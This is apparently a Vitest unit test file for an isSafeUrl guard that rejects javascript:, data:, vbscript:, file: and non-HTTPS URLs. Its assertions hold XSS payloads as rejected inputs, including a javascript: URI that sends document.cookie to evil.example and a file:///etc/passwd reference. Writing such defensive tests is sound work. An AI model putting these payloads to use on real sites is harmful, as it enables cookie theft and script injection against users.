import { describe, expect, it } from 'vitest';

import { isSafeUrl } from './isSafeUrl';

describe('isSafeUrl', () => {
  it('accepts https:// URLs', () => {
    expect(isSafeUrl('https://www.linkedin.com/in/foo')).toBe(true);
    expect(isSafeUrl('https://example.com')).toBe(true);
  });

  it('rejects http:// URLs to enforce TLS for outbound profile links', () => {
    expect(isSafeUrl('http://example.com')).toBe(false);
  });

  it('rejects javascript: URIs (the XSS sink this guard exists for)', () => {
    expect(isSafeUrl('javascript:alert(1)')).toBe(false);
    expect(isSafeUrl('JAVASCRIPT:alert(1)')).toBe(false);
    expect(
      isSafeUrl('  javascript:fetch("https://evil.example/?"+document.cookie)')
    ).toBe(false);
  });

  it('rejects other dangerous schemes', () => {
    expect(isSafeUrl('data:text/html,<script>alert(1)</script>')).toBe(false);
    expect(isSafeUrl('vbscript:msgbox("xss")')).toBe(false);
    expect(isSafeUrl('file:///etc/passwd')).toBe(false);
  });

  it('rejects scheme-less or malformed values', () => {
    expect(isSafeUrl('linkedin.com/in/foo')).toBe(false);
    expect(isSafeUrl('//evil.example')).toBe(false);
    expect(isSafeUrl('not a url')).toBe(false);
  });

  it('rejects empty / nullish input', () => {
    expect(isSafeUrl('')).toBe(false);
    expect(isSafeUrl(null)).toBe(false);
    expect(isSafeUrl(undefined)).toBe(false);
  });
});
